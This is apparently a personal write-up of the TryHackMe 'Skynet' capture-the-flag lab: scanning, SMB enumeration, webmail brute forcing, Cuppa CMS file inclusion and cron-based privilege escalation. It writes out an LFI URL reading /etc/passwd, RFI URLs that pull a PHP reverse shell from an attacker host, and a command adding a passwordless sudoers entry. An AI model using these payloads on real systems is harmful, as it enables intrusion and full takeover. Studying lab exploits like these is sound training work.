### Skynet

export IP=10.10.68.81

#### Deploy and compromise the vulnerable machine!

What is Miles password for his emails?
- cyborg007haloterminator


nmap scan:

![](../../img/Pasted%20image%2020220827201706.png)

Gobuster scan:

![](../../img/Pasted%20image%2020220827203111.png)

Looking at the pages on the browser, almost all pages return nothing, except the /squirrelmail, where we need to login our credentials:


![](../../img/Pasted%20image%2020220827203156.png)

Looking for other vectors of attack, we observed the smb port is open. We will try to enumerate the port using smbmap:

![](../../img/Pasted%20image%2020220827203243.png)

There are 2 directories of interest, the anonymous and the milesdyson share. We will open both directories and get all information we can get:

Anonymous is easy to open since it does not use credentials:

![](../../img/Pasted%20image%2020220827203357.png)

Opening up attention.txt file (after we get all files from the share)

![](../../img/Pasted%20image%2020220827203429.png)

Opening up log1.txt:

![](../../img/Pasted%20image%2020220827203447.png)

Other logs provide no details.

Since we have a possible wordlist of passwords to be used on user milesdyson, we can either use hydra or burpsuite to bruteforce login and provide us the correct password. I use hydra for this challenge:

![](../../img/Pasted%20image%2020220827203818.png)

After logging in the credentials on the /squirrelmail page, we are now inside miles's inbox:

![](../../img/Pasted%20image%2020220827204045.png)

We can check for email called 'Samba Password reset'

![](../../img/Pasted%20image%2020220827204115.png)

Message:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Using these credentials, we can now login to miles' smb share:

![](../../img/Pasted%20image%2020220827204226.png)

We have noticed the /notes folder:

![](../../img/Pasted%20image%2020220827204438.png)

looking inside notes directory, all files have .md pdf files except important.txt:

![](../../img/Pasted%20image%2020220827204520.png)

These are the details of important.txt:

![](../../img/Pasted%20image%2020220827204601.png)


What is the hidden directory?
- /45kra24zxs28v3yd

We visit the page and we are greeted by a picture:

![](../../img/Pasted%20image%2020220827204644.png)

We perform enumeration on the secret page and the results are as follows:

![](../../img/Pasted%20image%2020220827220920.png)

We visit the page /administrator but it seems that we need credentials again:

![](../../img/Pasted%20image%2020220827220954.png)

After this, we tried to use searchsploit for any vulnerabilities:

![](../../img/Pasted%20image%2020220827221033.png)

After searching, we can see that there is a vulnerability that uses local file inclusion for obtaining RCE, thus we tried to perform the LFI first:

![](../../img/Pasted%20image%2020220827221146.png)

For the LFI, we will use this syntax first to check if it really is working:

`http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

Modifying into this:

`http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

Reveals into this:

![](../../img/Pasted%20image%2020220827221323.png)

At this point, we can safely assume that RFI (remote file inclusion) is also possible, and i got stuck in this point.

We will now craft the RFI section of the vuln:

`http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47:8080/reverse_shell.php?`

With which we will create a file in our local directory:

![](../../img/Pasted%20image%2020220827221852.png)

![](../../img/Pasted%20image%2020220827221902.png)

We will create a http.server on port 80 and netcat:

![](../../img/Pasted%20image%2020220827221934.png)

![](../../img/Pasted%20image%2020220827221945.png)

Then, after performing this link, we can now see that the httpserver has provided the php-reverse-shell file and netcat has now connected to the payload:

![](../../img/Pasted%20image%2020220827222042.png)

![](../../img/Pasted%20image%2020220827222057.png)

![](../../img/Pasted%20image%2020220827222109.png)

then performed shell stabilisation:

![](../../img/Pasted%20image%2020220827222126.png)

Then performed search for user.txt using find:

![](../../img/Pasted%20image%2020220827223411.png)

User flag:
7ce5c2109a40f958099283600a9ae807

For the privilege escalation, we performed sudo -l , transfer linenum, but to no luck. Instead, we checked /etc/crontabs and we found the following:

![](../../img/Pasted%20image%2020220827224758.png)

We opened the backup.sh and it says that we cd to var/ww/html and backup all the contents there every minute:

![](../../img/Pasted%20image%2020220827224846.png)

This is where i got stuck and searched for help. Here is the syntax for obtaining root:

![](../../img/Pasted%20image%2020220827224955.png)

Link: https://medium.com/azkrath/tryhackme-walkthrough-skynet-69399702ee5a


echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh


http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php

http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.48.47/php-reverse-shell.php?